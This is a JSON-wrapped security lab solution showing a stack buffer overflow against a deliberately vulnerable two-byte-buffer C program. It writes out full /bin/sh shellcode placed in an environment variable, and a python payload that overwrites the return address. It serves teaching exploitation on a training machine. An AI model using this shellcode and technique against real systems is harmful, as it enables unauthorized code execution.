{"description":"Stack-based buffer overflow example via environment variables","goal":"<p>Execute a simple buffer overflow by exploiting a vulnerable C program and injecting a shellcode inside a maliciously crafted environment variable!</p>\n<p><br /><br /></p>\n<p>&nbsp;</p>","solution":"<h2>Prolog</h2>\n<p>For a general discussion about basic stack-based buffer overflow techiques, please have a look at lab <em>L10_BufferOverflow_1</em>. In this lab we will move one step further, by showing how the same attack as the one described in the above mentioned introductory lab can be conducted even in the absence of sufficient space for injecting the malicious code directly into the stack.</p>\n<p>To the purpose, we will crack a vulnerable program making an unsafe use of a very small buffer (just two bytes long).</p>\n<h2>The vulnerable program</h2>\n<p>The sample code for this lab is located in the \"/BufferOverflow\" folder of the hacking machine and is named envuln.c</p>\n<pre><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC1\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"><span class=\"cp\" style=\"box-sizing: border-box; color: #999999; font-weight: bold;\">#include &lt;stdio.h&gt;</span></span>\n<span id=\"LC2\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"><span class=\"cp\" style=\"box-sizing: border-box; color: #999999; font-weight: bold;\">#include &lt;stdlib.h&gt;</span></span>\n<span id=\"LC3\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"><span class=\"cp\" style=\"box-sizing: border-box; color: #999999; font-weight: bold;\">#include &lt;string.h&gt;</span></span>\n<span id=\"LC4\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span>\n<span id=\"LC5\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"><span class=\"kt\" style=\"box-sizing: border-box; color: #445588; font-weight: bold;\">int</span> <span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">main</span><span class=\"p\" style=\"box-sizing: border-box;\">(</span><span class=\"kt\" style=\"box-sizing: border-box; color: #445588; font-weight: bold;\">int</span> <span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">argc</span><span class=\"p\" style=\"box-sizing: border-box;\">,</span><span class=\"kt\" style=\"box-sizing: border-box; color: #445588; font-weight: bold;\">char</span><span class=\"o\" style=\"box-sizing: border-box; font-weight: bold;\">**</span> <span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">argv</span><span class=\"p\" style=\"box-sizing: border-box;\">){</span></span>\n<span id=\"LC6\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span>\n<span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">\t<span class=\"kt\" style=\"box-sizing: border-box; color: #445588; font-weight: bold;\">char</span> <span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">buff</span><span class=\"p\" style=\"box-sizing: border-box;\">[</span><span class=\"mi\" style=\"box-sizing: border-box; color: #009999;\">2</span><span class=\"p\" style=\"box-sizing: border-box;\">];</span></span>\n<span id=\"LC8\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span>\n<span id=\"LC9\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">\t<span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">strcpy</span><span class=\"p\" style=\"box-sizing: border-box;\">(</span><span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">buff</span><span class=\"p\" style=\"box-sizing: border-box;\">,</span><span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">argv</span><span class=\"p\" style=\"box-sizing: border-box;\">[</span><span class=\"mi\" style=\"box-sizing: border-box; color: #009999;\">1</span><span class=\"p\" style=\"box-sizing: border-box;\">]);</span></span>\n<span id=\"LC10\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">\t<span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">printf</span><span class=\"p\" style=\"box-sizing: border-box;\">(</span><span class=\"s\" style=\"box-sizing: border-box; color: #dd1144;\">\"Il tuo buffer contiene: %s </span><span class=\"se\" style=\"box-sizing: border-box; color: #dd1144;\">\\n</span><span class=\"s\" style=\"box-sizing: border-box; color: #dd1144;\">\"</span><span class=\"p\" style=\"box-sizing: border-box;\">,</span><span class=\"n\" style=\"box-sizing: border-box; color: #333333;\">buff</span><span class=\"p\" style=\"box-sizing: border-box;\">);</span></span>\n<span id=\"LC11\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">\t<span class=\"k\" style=\"box-sizing: border-box; font-weight: bold;\">return</span> <span class=\"mi\" style=\"box-sizing: border-box; color: #009999;\">1</span><span class=\"p\" style=\"box-sizing: border-box;\">;</span></span>\n<span id=\"LC12\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span>\n<span id=\"LC13\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"><span class=\"p\" style=\"box-sizing: border-box;\">}</span></span></code></pre>\n<p>As you can see from the code above, we pass a string to the program as a command line parameter. Such a string is then <strong>unsafely</strong> copied, via the <code>strcpy()</code> function, into the local variable <code>buf[]</code> inside the main program. Such a local variable will be used to carry out the exploit. The issue here is that the space allocated on the stack for the local variable is not enough to contain the shell code we are willing to execute. We will hence have to think of an alternative approach. Namely, we will:</p>\n<ol>\n<li>store the shellcode in an ad hoc crafted environment variable;</li>\n<li>overwrite the return address with the address in memory where the newly defined environment variable has been stored by the operating system.</li>\n</ol>\n<p>Thanks to the above trick, instead of returning control to the Operating System as expected, the main will leave the floor to our malicious code when exiting!</p>\n<h2>Compiling and testing the program</h2>\n<p>Let's use the <em>gcc</em> compiler, with the following flags:</p>\n<ul>\n<li><span style=\"font-size: inherit;\"><em><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">-fno-stack-protector --&gt;</span></code></em></span> do not emit extra code to check for buffer overflows;<span style=\"font-size: inherit;\"><em><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code></em></span><span style=\"font-size: inherit;\"><em><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code></em></span></li>\n<li><span style=\"font-size: inherit;\"><em>-no-pie --&gt; </em>do not produce a <em>Position Independent Executable</em> (PIE);</span></li>\n<li><span style=\"font-size: inherit;\"><em>-z execstack --&gt; </em>option passed straight to the linker </span><span class=\"pln\">and marking </span><span class=\"pln\">the object code as requiring executable </span><span class=\"typ\">stack;</span></li>\n<li><span style=\"font-size: inherit;\"><em>-ggdb --&gt; <code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"></code></em></span>Produce debugging information for use by GDB.</li>\n</ul>\n<p>Here is the whole command to be executed:</p>\n<pre><span id=\"LC7\">gcc -fno-stack-protector -no-pie -z execstack -o vuln envuln.c -ggd<code>b</code></span><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code></pre>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_02_gcc.png\" alt=\"Compiling with gcc\" width=\"1910\" height=\"268\" /></p>\n<p>Let's now run the program with a non-offending input...</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_03_NonOffendingInput.png\" alt=\"A &quot;safe&quot; run of the program\" width=\"914\" height=\"126\" /></p>\n<p>...and with an offending one (&gt;10 characters in input to the program)!</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_03_bis_OffendingInput.png\" alt=\"Crashing the vulnerable program\" /></p>\n<h2>Analyzing the program with gdb</h2>\n<p>Let's now have a look at the program in gdb:</p>\n<p><code># gdb ./envuln</code></p>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_04_gdb_start.png\" alt=\"Launching the program under the gdb debugger\" /></p>\n<p>Let's disassemble the <em>main</em> function and check the dimension of the buffer that gets allocated on the stack:</p>\n<p><code>(gdb) disas main</code></p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_05_gdb_disas_main.png\" alt=\"Disassembling a function with gdb\" /></p>\n<p>As you can see from the dump, the start of the memory area allocated to the buf[] local variable is 2 (0x2 exadecimal) bytes above the base pointer register (rbp).You can see this, e.g., from the instruction&nbsp;<em>\"lea -0x2(%rbp),%rax\" </em>that is used to prepare the parameters in view of the call to the&nbsp;<em>strcpy </em>function in the main.</p>\n<p>This means that the space we will have to fill in before starting to overwrite the return address is 10 bytes (2 for the buf[] variable, plus 8 for the old base pointer). A string that does the job of filling the stack space and then overwriting the return address with an ad hoc crafted return address can be constructed, e.g., with the following python command:</p>\n<pre class=\"code highlight\" style=\"box-sizing: border-box; overflow: auto hidden; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: 13px !important; display: block; padding: 10px; margin: 0px; line-height: 1.5 !important; word-break: break-all; overflow-wrap: normal; color: #333333; background-color: #ffffff; border-top: none #f0f0f0; border-right: none #f0f0f0; border-bottom: none #f0f0f0; border-left: 1px solid #f0f0f0; border-image: initial; border-radius: 0px; text-shadow: none; white-space: pre; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC22\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">python -c 'print \"A\"*10+\"\\x7f\\xff\\xff\\xff\\xef\\xbe\"[::-1]'</span></code></pre>\n<p>In the above string, we will obviously have to replace the last six bytes with the target return address, which in this case cannot point to a location in the stack where we have injected the shellcode just because of the fact that we have not enough space available. This time we will have to use a workaround. Basically, we will leverage an ad hoc created environment variable holding the shellcode and replace the return address with the address in memory where the operating system allocates such a variable.</p>\n<p>Let's hence move our atttention to this specific part.</p>\n<h2>Creating an environment variable containing the shellcode</h2>\n<p>Let's first of all have a look at the environment variables in the system, through the <em>env </em>command<em>.</em></p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_06_env_1.png\" alt=\"A look at the environment variables\" /></p>\n<p>As you can see, the system already holds a number of variables, associated with different properties of the running environment.</p>\n<p>We can now create a new variable where we are going to store our shellcode. The command used to achieve such a goal is the following:</p>\n<pre class=\"code highlight\" style=\"box-sizing: border-box; overflow: auto hidden; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: 13px !important; display: block; padding: 10px; margin: 0px; line-height: 1.5 !important; word-break: break-all; overflow-wrap: normal; color: #333333; background-color: #ffffff; border-top: none #f0f0f0; border-right: none #f0f0f0; border-bottom: none #f0f0f0; border-left: 1px solid #f0f0f0; border-image: initial; border-radius: 0px; text-shadow: none; white-space: pre; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC11\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">export SHELLCODE=$(perl -e 'print \"\\x90\"x10,\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"')</span></code></pre>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_06_env_2.png\" alt=\"Setting the SHELLCODE env variable\" /></p>\n<p>If we now re-check the environment, we will find our new variable in it.</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_06_env_3.png\" alt=\"Re-checking the environment\" /></p>\n<p>&nbsp;As you can see from the picture, the newly added variable is now available as part of the running environment.</p>\n<p>We're now ready for the exploit.</p>\n<h2>Launching the attack!</h2>\n<p>As a first step, let's open again the program in gdb, disassemble the <em>main </em>function, and set a break point as soon as execution reaches it.</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_07_break_main.png\" alt=\"Setting a breakpoint associated with the main function in gdb\" /></p>\n<p>We can now run the program with a test string and wait until the flow of execution reaches the breakpoint.</p>\n<p><code>(gdb) r PIPPOZZO</code></p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_08_run_pippozzo.png\" alt=\"Running the program with a test string\" /></p>\n<p>As you can see from the picture above, the program pauses as soon as the main function is reached. This is good for us, since we can now inspect memory while the process is still alive. What we'll do now is to look for the memory location where the SHELLCODE environment variable has been allocated. A command like this can do the job:</p>\n<p>&nbsp;<code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC16\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">x/500s $rsp</span></code></p>\n<p>With such a command we inspect memory in the proximity of the stack pointer and look for strings.</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_09_seek_strings.png\" alt=\"Looking for strings in memory\" /></p>\n<p>If you execute such a command in gdb and start browsing through memory, you will end up finding the area in which all environment variables have been allocated. Among such variables you will easily identify our ad hoc crafted SHELLCODE string. In the example in the picture above, the variable in question has been stored at address 0x7fffffffefb5. If we start at that addreess and skip the very first 10 bytes (associated with the string \"SHELLCODE=\"), we will directly point to the start of the shellcode, as witnessed by the screenshot below:</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_10_seek_shellcode.png\" alt=\"Pointing to the SHELLCODE string's contents\" width=\"1794\" height=\"116\" /></p>\n<p><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"></code></p>\n<p>We're almost there. The shellcode is located at memory address 0x7fffffffefbf. This is hence the address that we have to use when overwriting the return address with the stack smashing string we use to feed the main program. We will run again the program in gdb with the following input argument:</p>\n<pre class=\"code highlight\" style=\"box-sizing: border-box; overflow: auto hidden; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: 13px !important; display: block; padding: 10px; margin: 0px; line-height: 1.5 !important; word-break: break-all; overflow-wrap: normal; color: #333333; background-color: #ffffff; border-top: none #f0f0f0; border-right: none #f0f0f0; border-bottom: none #f0f0f0; border-left: 1px solid #f0f0f0; border-image: initial; border-radius: 0px; text-shadow: none; white-space: pre; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC22\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">python -c 'print \"A\"*10+\"\\x7f\\xff\\xff\\xff\\xef\\xbf\"[::-1]'</span></code></pre>\n<p>Let's see what happens:</p>\n<pre class=\"code highlight\" style=\"box-sizing: border-box; overflow: auto hidden; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: 13px !important; display: block; padding: 10px; margin: 0px; line-height: 1.5 !important; word-break: break-all; overflow-wrap: normal; color: #333333; background-color: #ffffff; border-top: none #f0f0f0; border-right: none #f0f0f0; border-bottom: none #f0f0f0; border-left: 1px solid #f0f0f0; border-image: initial; border-radius: 0px; text-shadow: none; white-space: pre; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC22\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">(gdb) r $(python -c 'print \"A\"*10+\"\\x7f\\xff\\xff\\xff\\xef\\xbf\"[::-1]')<br /></span></code></pre>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_2/.images/L10_2_11_system_pwned.png\" alt=\"System pwned!\" /></p>\n<p>Voil&agrave;! System pwned ;-)</p>","author":"spromano"}
